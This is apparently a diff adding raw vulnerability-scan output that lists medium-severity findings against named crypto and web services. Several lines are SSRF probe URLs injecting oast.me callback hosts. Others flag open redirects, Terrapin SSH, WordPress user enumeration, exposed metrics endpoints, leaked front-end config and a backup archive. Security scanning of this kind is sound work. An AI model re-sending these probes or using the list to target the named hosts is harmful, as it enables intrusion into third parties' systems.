@@ -1,0 +1,35 @@
+[CVE-2017-9506] [http] [medium] https://ddocs-indexer.fileverse.io/plugins/servlet/oauth/users/icon-uri?consumerUri=http://d9c4gj0226q3ehsrcl0ges8acxmoe4gwj.oast.me
+[CVE-2017-9506] [http] [medium] https://identity-v1.fileverse.io/plugins/servlet/oauth/users/icon-uri?consumerUri=http://d9c55cdtsdp3ckgli8bghec73758scw9x.oast.online
+[CVE-2020-10770] [http] [medium] https://ddocs-indexer.fileverse.io/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://d9c4gj0226q3ehsrcl0gqkznnk9inm5rj.oast.me/
+[CVE-2020-5775] [http] [medium] https://ddocs-indexer.fileverse.io/external_content/retrieve/oembed?endpoint=http://d9c4gj0226q3ehsrcl0gdbzi69555ipka.oast.me&url=foo
+[CVE-2023-48795] [javascript] [medium] dev.helixapp.com:22 ["Vulnerable to Terrapin"]
+[CVE-2023-48795] [javascript] [medium] gov.fluid.io:22 ["Vulnerable to Terrapin"]
+[CVE-2023-5561] [http] [medium] https://hedera.com/?rest_route=/wp/v2/users&search=@ [route="?rest_route=/wp/v2/users&"]
+[CVE-2023-5561] [http] [medium] https://www.hedera.com/wp-json/wp/v2/users?search=@ [route="wp-json/wp/v2/users?"]
+[CVE-2025-54793] [http] [medium] https://testnet.helixapp.com//interact.sh/en
+[CVE-2025-57822] [http] [medium] https://v2-explorer-sepolia.hop.exchange/?cb=OFLetQrQrs
+[CVE-2026-55592] [http] [medium] https://base-eggs-vault.holdstation.com/healthz ["1"]
+[azure-functions-hostjson-exposure] [http] [medium] http://push.frame.sh/host.json
+[godaddy-parked-domain] [http] [medium] https://www.imtoken.com/lander
+[mongodb-exporter-metrics] [http] [medium] https://dev-web2-api.flaunch.gg/metrics
+[mongodb-exporter-metrics] [http] [medium] https://ledger-api.internetcomputer.org/metrics
+[nextjs-vite-public-env:public_env] [http] [medium] https://newsletter.hyperlane.xyz [""VITE_ADNETWORK_PIXELJS_URL":"https://beehiiv-adnetwork-production.s3.amazonaws.com/pixel-js.js"",""VITE_ADNETWORK_PIXELV2_URL":"https://beehiiv-adnetwork-production.s3.amazonaws.com/pixel-v2.js"",""VITE_BIRDIE_CLIENT_ID":"q2je1lwj"",""VITE_SHOW_NECTAR_CONSOLE":"false"",""VITE_CAL_OAUTH_CLIENT_ID":"cmh1rxzo40003ql1r4zddst44"",""VITE_EXTERNAL_EMBED_DOMAIN":"beehiivusercontent.com"",""VITE_HUMAN_ENABLED":"true"",""VITE_HUMAN_URL":"//client.px-cloud.net/PXeBumDLwe/main.min.js""]
+[open-redirect-generic] [http] [medium] https://testnet.helixapp.com//oast.me/..;/css [redirect="/oast.me/..;/css"]
+[prometheus-metrics] [http] [medium] https://api.hc.jpool.one/metrics
+[prometheus-metrics] [http] [medium] https://api.production.play.flow.com/metrics
+[prometheus-metrics] [http] [medium] https://api.staging.play.flow.com/metrics
+[prometheus-metrics] [http] [medium] https://api.v1.play.flow.com/metrics
+[prometheus-metrics] [http] [medium] https://asdasd-c0b25935.frameworks.network/metrics
+[prometheus-metrics] [http] [medium] https://chandler.frameworks.network/metrics
+[prometheus-metrics] [http] [medium] https://foghorn.frameworks.network/metrics
+[prometheus-metrics] [http] [medium] https://grafana-explore.dev.hubbleprotocol.io/metrics
+[prometheus-metrics] [http] [medium] https://grafana-explore.hubbleprotocol.io/metrics
+[prometheus-metrics] [http] [medium] https://icrc-api.internetcomputer.org/metrics
+[prometheus-metrics] [http] [medium] https://index-api.sequencer.mainnet.fuel.network/metrics
+[prometheus-metrics] [http] [medium] https://media-eu-1.frameworks.network/metrics
+[prometheus-metrics] [http] [medium] https://media-us-1.frameworks.network/metrics
+[prometheus-metrics] [http] [medium] https://metrics-api.internetcomputer.org/metrics
+[prometheus-metrics] [http] [medium] https://metrics.gauntlet.xyz/metrics
+[prometheus-metrics] [http] [medium] https://metrics.staging.gauntlet.xyz/metrics
+[prometheus-metrics] [http] [medium] https://sns-api.internetcomputer.org/metrics
+[zip-backup-files] [http] [medium] https://cdn-dev.janushenderson.com/uploads.tar.gz [EXT="tar.gz",FILENAME="uploads"]
